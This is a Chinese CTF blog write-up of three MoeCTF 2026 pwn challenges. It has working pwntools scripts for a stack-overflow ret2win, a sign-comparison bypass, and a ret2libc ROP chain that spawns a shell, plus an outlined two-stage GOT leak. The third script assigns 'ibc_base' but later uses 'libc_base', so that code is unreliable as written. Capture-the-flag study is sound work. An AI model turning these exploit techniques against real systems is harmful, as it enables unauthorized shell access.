+++
date = '2026-09-20T12:34:45+08:00'
draft = false
title = 'Moectf 2026'
tags = ["pwn"]
categories = ["CTF"]
+++


## 一、走后门

### 1.解体步骤

首先将题目丢到IDA中，发现后门函数backdoor的内存地址为`0x401209`，这是我们劫持rip后要返回的地址，可以直接拿到shell

![函数](/images/moectf-2026/图片1.png)

#### ①试错

由下图可知缓冲区为64个字节，再加上旧rbp，也就是main函数的返回地址的8个字节，所以我们只要填充72个垃圾字节，再加上backdoor函数地址，就构造出payload
![vuln](/images/moectf-2026/图片2.png)

```python
from pwn import *

io = remote('127.0.0.1',44133)

io.sendline(b'100')

io.send(b'a'*72 + p64(0x401209))

io.interactive()
```

但是，运行后崩溃了。猜测是由于栈不对齐导致的，于是去验证一下，重新编写payload：

#### ②寻找ret

我试了两种方法，一种是先进入pwndbg，执行`rop`指令，然后寻找ret
![ret](/images/moectf-2026/图片4.png)
找到`ret`地址为`0x40101a`

还可以执行`ROPgadget --binary '/home/run/pwn' --only "pop|ret" | grep "rdi"`来看，更清晰（但我用这种方法时有的时候不管用）

#### ③最终版

```python
from pwn import *

io = remote('127.0.0.1',44133)

io.sendline(b'100')

io.send(b'a'*72 + p64(0x40101a)+ p64(0x401209))

io.interactive()
```

### 2.flag

![flag](/images/moectf-2026/图片3.png)

## 二、灯神的愿望

### 1.解题步骤

扔进IDA，注意到，执行win函数即可拿到shell
![ret](/images/moectf-2026/图片5.png)

分析main函数
![ret](/images/moectf-2026/图片6.png)

对于第一个问题，显然必须输入1，否则直接break
此时，`n2`被赋值为`1`
接着进入第二问，它将我们的输入的值先赋给`n0x1BF51_1`，且必须小于0，否则`break`。然后，程序又把值赋给了`n0x1BF51`，蹦出来一句话，没什么用。然后继续给出那三个选项，不过，我们输入的第二个值要求比0x1BF51更大，换到十进制为114513，而我们第二个值还必须是不大于0的，所以自然想到无符号数，一个`-1`搞定，然后输入`3``许愿

### 2.payload

```python
from pwn import *

io = remote('127.0.0.1',34749)

io.sendline(b'1')

io.sendline(b'-1')

io.sendline(b'3')

io.interactive()
```

### 3.flag

![ret](/images/moectf-2026/图片7.png)
![ret](/images/moectf-2026/图片8.png)

## 三、Hello-World01

### 1. 解题步骤

#### ①拿到 pwn 程序，先执行基础检查：

1. `file ./pwn`：查看是 64 位 ELF 程序
2. `checksec ./pwn`：看保护
   - 开启 PIE？本题没有，所以`gadget（pop rdi;ret`地址是固定硬编码，直接能用
   - RELRO：Partial RELRO，GOT 表可泄露
   - NX 开启：栈不可执行，**不能写 shellcode，只能用 ROP**，这就是我们要做`ret2libc`的原因

#### ②大致思路

进入IDA查看程序逻辑
![main](/images/moectf-2026/图片9.png)
注意到第一空需要我们填`printf`或者`puts`，然后会给出其真实地址，然后只要找到它在外部库的偏移地址，就能算出基地址，从而再根据`system`函数和`/bin/sh`的偏移地址，算出他们的真实地址，从而构造ROP链。

#### ③准备工作

这里我选择的是printf，当然，puts的逻辑是一样的
![第一问](/images/moectf-2026/图片10.png)
然后提示：`Now show me your real pwn skill:`，在这里接收我们栈溢出的 payload

在libc.so.6里面找到`printf`、`system`函数和`/bin/sh`的偏移地址
![system](/images/moectf-2026/图片13.png)
![/bin/sh](/images/moectf-2026/图片14.png)
![printf](/images/moectf-2026/图片15.png)

### 2. 构造payload

```python
from pwn import *

io = remote("127.0.0.1", 35485)

# 第一步：等待 "Your answer:"
io.recvuntil(b"Your answer:")
io.sendline(b"printf")

# 读取带泄露地址的整行,即 b'This function seems to be unsafe,right? 0x7ffff7c64080'
leak_line = io.recvline()
# 分割提取0x后面的地址
printf_leak = int(leak_line.split(b'0x')[1], 16)


# libc偏移
printf_offset = 0x61c90  # ptintf的偏移量
ibc_base = printf_leak - printf_offset  # libc基址
system_offset = 0x52290  # system的偏移量
binsh_offset = 0x1B45BD  # /bin/sh的偏移量

system = libc_base + system_offset  # system的实际地址
binsh = libc_base + binsh_offset    # /bin/sh的实际地址

# gadget
pop_rdi_ret = 0x4013d3    # ROP链传参用的
ret_gadget  = 0x40101a    # 栈对齐用的

payload  = b'a'*72        # IDA里面找到的，64+8
payload += p64(pop_rdi_ret)   # 把栈顶上8字节弹出，放到rdi寄存器，
payload += p64(binsh)  # 把第一个参数/bin/sh放入rdi寄存器
payload += p64(ret_gadget)  # 栈对齐
payload += p64(system)  #跳到`system`函数执行

# 等待ROP输入提示
io.recvuntil(b"Now show me your real pwn skill:")
io.sendline(payload)

io.interactive()


```

### 3. flag

![证据](/images/moectf-2026/图片11.png)
![证据](/images/moectf-2026/图片12.png)

### 4. 关于本题另一些思考

本题中很重要的一个点是题目给我们`frintf`或者`puts`的地址了，从而很方便的获取了偏移地址。但如果没有这个提示，难度会加大。围绕这一点，我做出进一步研究。
程序不会主动输出任何 libc 地址。我们必须分**两阶段 ROP**：
阶段 1：构造 ROP，调用`puts(puts_got)`，把 GOT 表中 puts 的真实地址打印出来（**泄露 libc 地址**）
`垃圾填充(72B) + pop_rdi_ret + p64(puts_got) + p64(puts_plt) + p64(vuln)`
阶段 2：拿到泄露的 puts 真实地址，计算 libc 基址，再构造第二条 ROP 链调用`system("/bin/sh")`
1. 接收 puts 打印出来的地址 `leak_puts_addr`
2. `libc_base = leak_puts_addr - libc.sym['puts']`
3. 计算：
   - `system = libc_base + libc.sym['system']`
   - `binsh = libc_base + next(libc.search(b'/bin/sh'))`
4. 构造 ROP 链（就是我们刚才写的这条，带 ret_gadget 栈对齐），发送，getshell